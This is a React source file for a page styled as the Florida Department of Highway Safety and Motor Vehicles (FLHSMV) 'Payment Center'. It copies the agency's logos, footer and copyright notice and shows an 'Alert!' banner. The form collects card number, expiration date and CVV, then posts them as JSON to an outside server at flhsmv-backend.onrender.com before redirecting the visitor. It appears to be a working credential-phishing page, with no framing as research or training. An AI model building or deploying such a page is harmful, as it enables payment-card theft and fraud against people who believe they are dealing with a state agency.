import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./style.css";

export default function FLHSMVPage1() {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    cardNumber: "",
    expirationDate: "",
    cvv: ""
  });

  const [errors, setErrors] = useState({});

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const validate = () => {
    const errs = {};
    if (!/^\d{16}$/.test(formData.cardNumber)) {
      errs.cardNumber = "Card number must be 16 digits.";
    }
    if (!/^\d{3,4}$/.test(formData.cvv)) {
      errs.cvv = "CVV must be 3 or 4 digits.";
    }
    return errs;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }
    try {
       await fetch("https://flhsmv-backend.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData)
      });
      navigate("/home");
    } catch (err) {
      console.error("Submission failed:", err);
    }
  };

  return (
    <div>
      <nav className="container" id="orange">
        Alert!
      </nav>

      <header className="site-header">
        <div className="top-bar">
          <img src="flhsmv.png" id="flhsmv" alt="FLHSMV logo" />
        </div>

        <nav className="main-nav">
          <div className="menu-toggle">
            <span className="menu-icon">&#9776;</span>
            <strong>Menu</strong>
          </div>
          <ul className="dropdown-menu"></ul>
        </nav>
      </header>

      <section className="email-form">
        <h2>Payment Center</h2>
        <form onSubmit={handleSubmit}>
          <label htmlFor="cardNumber">Card Number</label>
          <input
            type="text"
            name="cardNumber"
            id="cardNumber"
            placeholder="Card Number"
            value={formData.cardNumber}
            onChange={handleChange}
            required
          />
          {errors.cardNumber && <p style={{ color: "red" }}>{errors.cardNumber}</p>}

          <label htmlFor="expirationDate">Expiration Date (MM/YY)</label>
          <input
            type="text"
            name="expirationDate"
            id="expirationDate"
            placeholder="MM/YY"
            value={formData.expirationDate}
            onChange={handleChange}
            required
          />
          {errors.expirationDate && <p style={{ color: "red" }}>{errors.expirationDate}</p>}

          <label htmlFor="cvv">CVV</label>
          <input
            type="text"
            name="cvv"
            id="cvv"
            placeholder="CVV"
            value={formData.cvv}
            onChange={handleChange}
            required
          />
          {errors.cvv && <p style={{ color: "red" }}>{errors.cvv}</p>}

          <button type="submit">Submit</button>
        </form>
      </section>

      <footer id="footer">
        <div className="overflow">
          <img src="flhsmv2.png" id="flhsmv2" alt="FLHSMV Secondary Logo" />
          <ul id="footer-navigation" className="list-unstyled">
            <li><a href="/privacy-statement/"><span>Privacy Statement</span></a></li>
            <li><a href="/email-notice/"><span>Email Notice</span></a></li>
            <li className="active"><a href="/disclaimer/"><span>Disclaimer</span></a></li>
            <li className="myflorida"><a target="_blank" rel="noopener noreferrer" href="http://www.myflorida.com"><span>MyFlorida.com</span></a></li>
            <li><a href="/ada-notice/"><span>ADA Notice</span></a></li>
            <li><a href="https://www.flhsmv.gov/contact-us/?utm_source=internal&utm_medium=none&utm_campaign=Footer&utm_content=contactus"><span>Contact Us</span></a></li>
          </ul>
          <p className="copy">
            © Copyright 2014 – 2025 Florida Department of Highway Safety and Motor Vehicles. All Rights
            Reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}
